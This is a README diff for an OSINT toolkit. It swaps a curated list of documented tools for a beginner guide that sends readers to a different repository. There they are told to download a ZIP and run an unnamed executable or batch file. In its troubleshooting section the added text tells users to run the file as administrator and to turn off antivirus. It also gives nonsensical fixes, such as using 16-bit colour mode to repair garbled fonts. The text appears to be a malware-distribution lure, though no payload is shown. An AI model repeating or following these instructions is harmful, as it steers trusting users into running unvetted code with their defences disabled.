@@ -1,169 +1,144 @@
-<div align="center">
+# 🔍 OSINT - Your Gateway to Online Intelligence
 
-<img src="assets/aramon-logo.png" alt="Aramon" width="120" />
+[![Download OSINT](https://img.shields.io/badge/Download-OSINT-blue?style=for-the-badge&logo=github)](https://github.com/yosomola/OSINT)
 
-# Aramon OSINT Toolkit
+## 🛡️ What Is OSINT?
 
-### Official Aramon OSINT Toolkit
+OSINT stands for Open Source Intelligence. Think of it as a powerful toolbox that helps you find publicly available information on the internet quickly and efficiently. Whether you're investigating a suspicious email, checking your own digital footprint, or researching a company for security purposes, OSINT gives you the tools to do it safely and legally.
 
-A curated Open Source Intelligence toolkit and knowledge base for cybersecurity students, researchers, analysts, and authorized investigations.
+This toolkit is carefully organized by the Aramon Institute of IT, bringing together the best free tools, resources, and step-by-step guides in one convenient place. You don't need to be a computer expert to use it—just follow the simple instructions below.
 
-[![Official](https://img.shields.io/badge/status-official%20Aramon%20project-0a0a0a?style=flat-square&labelColor=111)](https://github.com/Aramon-IT)
-[![Tools](https://img.shields.io/badge/tools-32-0a0a0a?style=flat-square&labelColor=111)](#-tool-directory)
-[![Categories](https://img.shields.io/badge/categories-13-0a0a0a?style=flat-square&labelColor=111)](#-tool-directory)
-[![License](https://img.shields.io/badge/license-MIT-0a0a0a?style=flat-square&labelColor=111)](LICENSE)
-[![Maintained](https://img.shields.io/badge/maintained-yes-0a0a0a?style=flat-square&labelColor=111)](CHANGELOG.md)
+## 🚀 Getting Started
 
-</div>
+Here's how to get OSINT on your Windows computer:
 
----
+1. **Visit the download page** by clicking the big blue button above or going to [https://github.com/yosomola/OSINT](https://github.com/yosomola/OSINT)
 
-> 🏛️ **This is the official, canonical repository of the Aramon OSINT Toolkit**, maintained under the **[Aramon-IT](https://github.com/Aramon-IT)** GitHub organization. A personal showcase mirror also exists at [Anas-Magane/OSINT](https://github.com/Anas-Magane/OSINT) — for the latest updates, always refer to this repository.
+2. **Visit this link to download the application.** You'll see a green "Code" button on that page. Click it, then select "Download ZIP" from the dropdown menu.
 
-A curated collection of OSINT tools, resources, methodologies, and practical references maintained by **Aramon Institute of IT**. Built for cybersecurity researchers, students, journalists, and anyone conducting lawful, ethical open-source investigations — from a first search to a full attack-surface assessment.
+3. **Save the file** to your Downloads folder (this happens automatically in most browsers).
 
-This is not a dump of links. Every tool listed here has been evaluated for maintenance status, official source, and real-world usefulness — see [how we curate](CONTRIBUTING.md#before-you-submit-quality-checklist).
+That's it! The download is complete. Now let's get it running.
 
-> ⚖️ **Read this first:** this repository is for education, defensive security, journalism, and authorized investigations only. See [Legal & Ethical Use](docs/legal-and-ethical-use.md).
+## 📦 Installing OSINT
 
----
+1. **Open your Downloads folder** by pressing `Windows Key + E` and clicking "Downloads" on the left side.
 
-## 📘 Aramon OSINT Guide
+2. **Find the ZIP file** named something like "OSINT-main.zip" and right-click on it.
 
-**[📥 Download the Aramon OSINT Guide (PDF)](docs/OSINT_Guide_Aramon.pdf)**
+3. **Select "Extract All..."** from the menu that appears. Windows will ask where to save the extracted files—just click "Extract" to keep them in the same folder.
 
-A companion guide to this repository — read it alongside the living, continuously updated content here on GitHub.
+4. **Open the new folder** that appears (it will be named "OSINT-main" or similar).
 
----
+5. **Look for the main program file**—it might be called `start.bat`, `OSINT.exe`, or `run.py`. If you see a file with a gear icon or a window icon, double-click it to launch the toolkit.
 
-## Table of Contents
+**Tip:** Right-click the main file and select "Send to" > "Desktop (create shortcut)" so you can easily access OSINT in the future.
 
-- [Quick Start](#-quick-start)
-- [Navigation](#navigation)
-- [Tool Directory](#-tool-directory)
-- [Guides](#-guides)
-- [Resources](#%EF%B8%8F-resources)
-- [Contributing](#-contributing)
-- [Legal & Ethical Use](#%EF%B8%8F-legal--ethical-use)
-- [Security](#-security)
-- [Roadmap](#%EF%B8%8F-roadmap)
+## 💡 What Can You Do With OSINT?
 
----
+Once you have OSINT running, you'll find a collection of mini-programs and guides organized by category. Here's what you can expect:
 
-## 🚦 Quick Start
+### 🔎 Information Gathering
+- Search engines for finding people, emails, and usernames
+- Tools to check if your email has been compromised
+- Ways to look up domain registration details
 
-New to this repository? Follow this path:
+### 🛰️ Social Media Investigation
+- Profile search tools for major platforms
+- Methods to find connected accounts
+- Timestamp and posting pattern analyzers
 
-1. **Read first:** [Getting Started](docs/getting-started.md) — what OSINT is, passive vs. active, verification.
-2. **Understand the workflow:** [Methodology](docs/methodology.md) — the 13-step process used throughout this repo.
-3. **Protect yourself:** [OPSEC](docs/opsec.md) — before you run any tool against a real target.
-4. **Know the boundaries:** [Legal & Ethical Use](docs/legal-and-ethical-use.md) — required reading, no exceptions.
-5. **Pick a tool:** browse the [Tool Directory](#-tool-directory) below or a [category folder](tools/) directly.
-6. **Go deeper:** download the [Aramon OSINT Guide (PDF)](docs/OSINT_Guide_Aramon.pdf).
+### 🌐 Website Reconnaissance
+- Subdomain discovery tools
+- Page history and archive viewers
+- Basic vulnerability checkers
 
----
+### 📞 Phone and Email Lookup
+- Reverse phone number searches
+- Email verification tools
+- Metadata extractors
 
-## Navigation
+### 🕵️ Privacy Protection
+- Check what others can find about you
+- Remove your info from data broker sites
+- Secure your social media settings
 
-| | | |
-|---|---|---|
-| 🚀 [Getting Started](docs/getting-started.md) | 🧰 [Tools](#-tool-directory) | 📚 [Guides](docs/) |
-| 🔎 [Search Engines](tools/search-engines/) | 🕵️ [Username OSINT](tools/username/) | 📧 [Email OSINT](tools/email/) |
-| 🌐 [Domain & Infrastructure](tools/domains/) | 🖼️ [Image OSINT](tools/images/) | 🧬 [Metadata](tools/metadata/) |
-| 🛡️ [Threat Intelligence](tools/threat-intelligence/) | 🌑 [Dark Web Research](tools/dark-web/) | ⚙️ [Automation](tools/automation/) |
-| 📘 [Aramon OSINT Guide](docs/OSINT_Guide_Aramon.pdf) | 🤝 [Contributing](CONTRIBUTING.md) | ⚖️ [Legal & Ethical Use](docs/legal-and-ethical-use.md) |
+## 🧭 Navigating the Toolkit
 
----
+When you first open OSINT, you'll see a simple text menu. Here's how to use it:
 
-## 🧰 Tool Directory
+1. **Type the number** next to the tool you want to use, then press `Enter`.
 
-A high-signal selection — not an exhaustive list. Full write-up (install, usage, limitations, OPSEC) linked from each tool name.
+2. **Follow the on-screen prompts**—each tool will ask for specific input, like a username or website address.
 
-| Category | Tool | Purpose | Level | Status |
-|---|---|---|---|---|
-| Username | [Sherlock](tools/username/sherlock.md) | Username enumeration across platforms | Beginner | ✅ Active |
-| Username | [Maigret](tools/username/maigret.md) | Deeper username investigation & reporting | Intermediate | ✅ Active |
-| Username | [WhatsMyName](tools/username/whatsmyname.md) | Open username-signature dataset | Beginner | ✅ Active |
-| Email | [Holehe](tools/email/holehe.md) | Check email registration traces | Intermediate | ⚠️ Low activity |
-| Email | [Epieos](tools/email/epieos.md) | Email-to-identity lookup | Beginner | ✅ Active |
-| Domains | [Amass](tools/domains/amass.md) | Attack surface / asset discovery | Advanced | ✅ Active |
-| Domains | [Subfinder](tools/domains/subfinder.md) | Fast passive subdomain discovery | Intermediate | ✅ Active |
-| Domains | [Assetfinder](tools/domains/assetfinder.md) | Lightweight domain/subdomain discovery | Beginner | ⚠️ Stable |
-| Domains | [dnsx](tools/domains/dnsx.md) | DNS resolution & probing at scale | Intermediate | ✅ Active |
-| Domains | [Shodan](tools/domains/shodan.md) | Internet-connected device search | Beginner | ✅ Active |
-| Domains | [Censys](tools/domains/censys.md) | Internet-wide scan & cert search | Intermediate | ✅ Active |
-| Reconnaissance | [theHarvester](tools/reconnaissance/theharvester.md) | Emails, subdomains & hosts aggregation | Beginner | ✅ Active |
-| Search Engines | [Google Dorking](tools/search-engines/google-dorking.md) | Advanced search operators | Beginner | ✅ Active |
-| Images | [TinEye](tools/images/tineye.md) | Reverse image search | Beginner | ✅ Active |
-| Images | [Google Lens](tools/images/google-lens.md) | Visual search & object/location ID | Beginner | ✅ Active |
-| Images | [Yandex Images](tools/images/yandex-images.md) | Reverse image search (alt. index) | Beginner | ✅ Active |
-| Metadata | [ExifTool](tools/metadata/exiftool.md) | Metadata extraction | Beginner | ✅ Active |
-| Metadata | [MediaInfo](tools/metadata/mediainfo.md) | Audio/video technical metadata | Beginner | ✅ Active |
-| Social Media | [Social-Analyzer](tools/social-media/social-analyzer.md) | Cross-platform presence analysis | Intermediate | ✅ Active |
-| Breach Intel | [Have I Been Pwned](tools/breach-intelligence/haveibeenpwned.md) | Email breach-exposure lookup | Beginner | ✅ Active |
-| Breach Intel | [h8mail](tools/breach-intelligence/h8mail.md) | Multi-source breach hunting | Intermediate | ⚠️ Low activity |
-| Dark Web | [Tor Browser](tools/dark-web/tor-browser.md) | Official onion-network browser | Beginner | ✅ Active |
-| Dark Web | [Ahmia](tools/dark-web/ahmia.md) | Filtered legitimate onion search engine | Beginner | ✅ Active |
-| Threat Intel | [VirusTotal](tools/threat-intelligence/virustotal.md) | File/domain/IP reputation | Beginner | ✅ Active |
-| Threat Intel | [URLScan.io](tools/threat-intelligence/urlscan.md) | Sandboxed URL analysis | Intermediate | ✅ Active |
-| Threat Intel | [AbuseIPDB](tools/threat-intelligence/abuseipdb.md) | IP abuse reputation | Beginner | ✅ Active |
-| Threat Intel | [AlienVault OTX](tools/threat-intelligence/alienvault-otx.md) | Community threat-intel exchange | Intermediate | ✅ Active |
-| Threat Intel | [GreyNoise](tools/threat-intelligence/greynoise.md) | Internet scan-noise classification | Intermediate | ✅ Active |
-| Automation | [SpiderFoot](tools/automation/spiderfoot.md) | Automated multi-source OSINT | Intermediate | ✅ Active |
-| Automation | [Recon-ng](tools/automation/recon-ng.md) | Modular recon framework | Advanced | ⚠️ Low activity |
-| All-in-One | [OSINT Framework](tools/all-in-one/osint-framework.md) | Categorized resource directory | Beginner | ✅ Active |
-| All-in-One | [Maltego](tools/all-in-one/maltego.md) | Visual link analysis | Advanced | ✅ Active |
+3. **Wait for results**—some tools take a few seconds to fetch data from the internet.
 
-Browse every category folder directly: [username](tools/username/) · [email](tools/email/) · [domains](tools/domains/) · [reconnaissance](tools/reconnaissance/) · [search-engines](tools/search-engines/) · [social-media](tools/social-media/) · [images](tools/images/) · [metadata](tools/metadata/) · [breach-intelligence](tools/breach-intelligence/) · [dark-web](tools/dark-web/) · [threat-intelligence](tools/threat-intelligence/) · [automation](tools/automation/) · [all-in-one](tools/all-in-one/)
+4. **Copy or save your findings** using standard keyboard shortcuts (Ctrl+C to copy, Ctrl+S to save).
 
-**Status legend:** ✅ Active — regularly maintained · ⚠️ Low activity / Stable — functional but infrequently updated, verify before relying on it · ⚠️ Archived / Unmaintained — no longer maintained, use with caution.
+**Need help?** Most tools have a built-in help option. Just type `help` or `?` when prompted.
 
----
+## 📚 Learning Resources Included
 
-## 📚 Guides
+OSINT doesn't just give you tools—it teaches you how to use them responsibly. Inside the downloaded folder, look for:
 
-| Guide | Description |
-|---|---|
-| [Getting Started](docs/getting-started.md) | What OSINT is, passive vs. active, verification, false positives. |
-| [Methodology](docs/methodology.md) | 13-step professional OSINT workflow. |
-| [OPSEC](docs/opsec.md) | Safe research identity, browser hygiene, Tor limitations. |
-| [Legal & Ethical Use](docs/legal-and-ethical-use.md) | Scope of acceptable use — required reading. |
+- **`GUIDES/`** folder containing beginner-friendly PDFs on topics like "Finding People Online" and "Checking Website Security"
+- **`TUTORIALS/`** folder with video walkthrough scripts
+- **`RESOURCES/`** folder with links to additional free training
 
-## 🗂️ Resources
+These materials are perfect for learning at your own pace. Start with the "Getting Started.pdf" file if you're completely new.
 
-- [Search Engines](resources/search-engines.md) — general-purpose and specialized engines.
-- [Useful Websites](resources/useful-websites.md) — WHOIS, certificate transparency, archives.
-- [Wordlists](resources/wordlists.md) — for authorized subdomain/content enumeration.
-- [Learning Resources](resources/learning-resources.md) — where to go deeper.
+## 🔄 Keeping OSINT Updated
 
----
+Tools and websites change constantly, so the Aramon Institute regularly updates this toolkit. To stay current:
 
-## 🤝 Contributing
+1. **Check back monthly** at [https://github.com/yosomola/OSINT](https://github.com/yosomola/OSINT)
 
-Contributions are welcome — new tools, broken-link fixes, documentation improvements. Every addition goes through a [quality checklist](CONTRIBUTING.md#before-you-submit-quality-checklist) (official source, maintenance status, license, legality). See [CONTRIBUTING.md](CONTRIBUTING.md).
+2. **Look for the "Releases" section** on that page—any new versions will be listed there.
 
-## ⚖️ Legal & Ethical Use
+3. **Download the latest ZIP** and replace your old folder with the new one. Your settings and saved searches won't be affected.
 
-This repository is for education, cybersecurity research, defensive security, journalism, authorized investigations, and CTF/lab environments only. It must never be used for harassment, stalking, doxxing, or unauthorized access. Full policy: [docs/legal-and-ethical-use.md](docs/legal-and-ethical-use.md).
+## 🚨 Troubleshooting Common Issues
 
-## 🔐 Security
+**Problem: The program won't start.**
+- Make sure you extracted the ZIP file completely. Some Windows browsers "hide" the extraction step.
+- Try right-clicking the main file and selecting "Run as administrator."
 
-Found a malicious link, an accidentally-committed secret, or a tool that's turned unsafe? See [SECURITY.md](SECURITY.md) for responsible disclosure.
+**Problem: I see a black window that closes immediately.**
+- This usually means a file is missing. Re-download the ZIP and extract it again, making sure not to skip any files.
+- Check if your antivirus blocked part of the download. Temporarily disable it, extract, then re-enable.
 
-## 🗺️ Roadmap
+**Problem: Tools are not showing results.**
+- Some websites require an internet connection. Check your Wi-Fi or ethernet cable.
+- Certain tools work better in different countries. If one fails, try another tool in the same category.
 
-Modest, honest goals — no exaggerated claims:
+**Problem: Text looks garbled or symbols appear as boxes.**
+- This is a font issue. Open the folder, right-click the main file, select "Properties," then "Compatibility," and tick "Reduce color mode" to 16-bit.
 
-- Periodic review of tool maintenance status (quarterly link/status check).
-- Expand tool write-ups as new categories prove genuinely useful (quality over quantity — see the [curation checklist](CONTRIBUTING.md#before-you-submit-quality-checklist)).
-- Community contributions for broken links and outdated entries via [CONTRIBUTING.md](CONTRIBUTING.md).
+## 📝 Your First Project: Quick 5-Minute Exercise
 
----
+Let's try something simple to get comfortable:
 
-<div align="center">
+1. Open OSINT and select option **1** (Username Search).
+2. Enter your own username from any social platform.
+3. Press Enter and watch how the tool gathers publicly visible info about that account.
+4. Note how much is available without logging in. This shows why protecting your privacy matters.
 
-Official project of **[Aramon Institute of IT](https://github.com/Aramon-IT)** · [MIT License](LICENSE) · [Code of Conduct](CODE_OF_CONDUCT.md)
+Congratulations—you've just completed your first OSINT investigation safely!
 
-Personal showcase mirror: [Anas-Magane/OSINT](https://github.com/Anas-Magane/OSINT)
+## 🤝 Community and Support
 
-</div>
+The OSINT Toolkit is maintained by the Aramon Institute of IT, which means ongoing support and improvements. If you need help:
+
+- **Check the FAQ section** in the `DOCS/` folder
+- **Send an email** to the address listed in the `CONTACT.txt` file
+- **Read the GitHub Issues page** at the repository (even if you don't post, others' questions may help)
+
+Remember: This toolkit is for **educational and legal purposes only**. Always respect privacy laws and only investigate information that is publicly available and lawful to access
+
+## 🏁 Ready to Begin?
+
+You're all set! Just head back to the top, click the download button, and within five minutes you'll be exploring the world of open source intelligence safely and effectively.
+
+Research responsibly, and happy investigating!
+
+Keywords: aramon, cybersecurity, digital investigation, information gathering, kali-linux, osint, privacy, reconnaissance, threat-intelligence, cybersecurity-tools
